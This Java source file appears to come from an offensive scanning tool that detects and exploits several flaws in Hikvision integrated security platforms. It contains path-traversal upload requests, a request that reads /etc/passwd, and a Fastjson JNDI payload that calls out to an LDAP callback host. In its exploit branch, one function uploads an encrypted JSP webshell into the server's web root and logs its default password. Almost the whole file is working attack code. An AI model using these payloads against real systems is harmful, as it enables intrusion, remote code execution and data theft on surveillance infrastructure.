package com.achuna33.Controllers;

import com.achuna33.SupportType.Poc_Exp;
import com.achuna33.SupportType.SupportVul;
import com.achuna33.Utils.*;

import java.net.MalformedURLException;

@BasicMapping(uri = "海康威视")
public class HIKVISIONController extends Controller implements BasicController{
    @VulnerabilityDescriptionMapping(Description = "海康威视综合安防 lm 文件上传漏洞",SupportVulType = SupportVul.UploadFile)
    public void vul_lm_Uploadfile(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  海康威视综合安防 lm 文件上传漏洞");
        String randomStr = Utils.getRandomString(4)+".jsp";
        String url = "/lm/api/files;.css";
        String data = "------WebKitFormBoundary9PggsiM755PLa54a\n" +
                "Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/lm/filename\"\n" +
                "Content-Type: application/zip\n" +
                "\n" +
                "\n" +
                "Yep!\n" +
                "------WebKitFormBoundary9PggsiM755PLa54a--";
        switch (type){
            case POC:
                data =data.replace("filename",randomStr);
                HttpRequest httpRequest = new HttpRequest(target+url);
                httpRequest.addHeaders("Content-Type","multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a");
                Response result = httpRequest.Post(data);
                if (result.statusCode==200 && result.responseBody.contains(randomStr)){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问地址："+target+"/lm/"+randomStr+";.css");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
                String payload = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>";
                data =data.replace("filename",randomStr);
                data =data.replace("Yep!",payload);
                HttpRequest httpRequest1 = new HttpRequest(target+url);
                httpRequest1.addHeaders("Content-Type","multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a");
                Response result1 = httpRequest1.Post(data);
                if (result1.statusCode==200 && result1.responseBody.contains(randomStr)){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问地址："+target+"/lm/"+randomStr+";.css");
                    WriteLog("\n[*] 默认连接密码rebeyond");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
        }
    }

    @VulnerabilityDescriptionMapping(Description = "海康威视综合安防 lm 文件读取漏洞",SupportVulType = SupportVul.信息泄露)
    public void vul_lm_Readfile(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  海康威视综合安防 lm 文件读取漏洞");
        String url = "/lm/api/files;.css?link=/etc/passwd";
        switch (type){
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                Response result = httpRequest.Get("");
                if (result.statusCode==200 && result.responseBody.contains("root")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问地址："+target+"/lm/api/files;.css?link=/etc/passwd");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
                break;
        }
    }

    @VulnerabilityDescriptionMapping(Description = "海康威视综合安防 center 文件上传漏洞",SupportVulType = SupportVul.UploadFile)
    public void vul_center(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  海康威视综合安防 center 文件上传漏洞");
        String randomStr = Utils.getRandomString(4)+".jsp";
        String url = "/center/api/files;.html";
        String data = "------WebKitFormBoundary9PggsiM755PLa54a\n" +
                "Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/filename\"\n" +
                "Content-Type: application/zip\n" +
                "\n" +
                "Yep!\n" +
                "------WebKitFormBoundary9PggsiM755PLa54a--";
        switch (type){
            case POC:
                data =data.replace("filename",randomStr);
                HttpRequest httpRequest = new HttpRequest(target+url);
                httpRequest.addHeaders("Content-Type","multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a");
                Response result = httpRequest.Post(data);
                if (result.statusCode==200 && result.responseBody.contains("Yep!")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问地址："+target+"/portal/ui/login/..;/..;/"+randomStr);
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
                break;
        }
    }

    @VulnerabilityDescriptionMapping(Description = "海康威视综合安防 report 文件上传漏洞",SupportVulType = SupportVul.UploadFile)
    public void vul_report(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  海康威视综合安防 report 文件上传漏洞");
        String randomStr = Utils.getRandomString(4)+".jsp";
        String url = "/svm/api/external/report";
        String data = "------WebKitFormBoundary9PggsiM755PLa54a\n" +
                "Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/filename\"\n" +
                "Content-Type: application/zip\n" +
                "\n" +
                "Yep!\n" +
                "------WebKitFormBoundary9PggsiM755PLa54a--";
        switch (type){
            case POC:
                data =data.replace("filename",randomStr);
                HttpRequest httpRequest = new HttpRequest(target+url);
                httpRequest.addHeaders("Content-Type","multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a");
                Response result = httpRequest.Post(data);
                if (result.statusCode==200 && result.responseBody.contains("Yep!")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问地址："+target+"/portal/ui/login/..;/..;/"+randomStr);
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
                break;
        }
    }

    @VulnerabilityDescriptionMapping(Description = "海康威视综合安防 iVMS-8700 Fsatjson 漏洞",SupportVulType = SupportVul.Jndi)
    public void vul_Fsatjson_Jndi(Poc_Exp type, String target, Object... args) throws Exception {
        WriteLog("\n[*]开始检测：  海康威视综合安防 iVMS-8700 Fsatjson 漏洞");
        String url = "/bic/ssoService/v1/applyCT";
        String data = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://dnslog\",\"autoCommit\":true},\"hfe4zyyzldp\":\"=\"}";
        switch (type){
            case POC:
                if (Cache.uiController.DNSDomain.getText().equals("")){
                    WriteLog("\n[*] DNS验证类型漏洞 请配置 DNSLOG 地址");
                    return;
                }else {
                    DNSLOG.setDomain(Cache.uiController.DNSDomain.getText());
                }
                String domain = DNSLOG.getRandomDomain();
                data = data.replace("dnslog",domain);
                HttpRequest httpRequest = new HttpRequest(target+url);
                httpRequest.addHeaders("Content-Type","application/json");
                httpRequest.Post(data);
                WriteLog("\n[*] 请自行判断是否成功。"+domain);
                WriteLog("\n[*] 漏洞详情：https://mp.weixin.qq.com/s/CEGjTyhphr2GMuK9zpl5bg");
            case EXP:
                break;
        }
    }

}
